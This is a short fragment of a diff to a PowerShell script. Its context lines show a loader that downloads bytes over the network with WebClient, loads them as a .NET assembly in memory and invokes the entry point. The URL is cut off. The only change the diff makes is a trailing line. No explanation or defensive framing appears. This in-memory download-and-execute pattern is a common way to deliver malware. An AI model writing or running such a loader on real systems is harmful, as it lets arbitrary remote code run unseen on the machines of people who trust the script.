@@ -4,3 +4,4 @@ $bytes = (New-Object System.Net.WebClient).DownloadData(
 
 $asm = [System.Reflection.Assembly]::Load($bytes)
 $asm.EntryPoint.Invoke($null, $null)
+ 
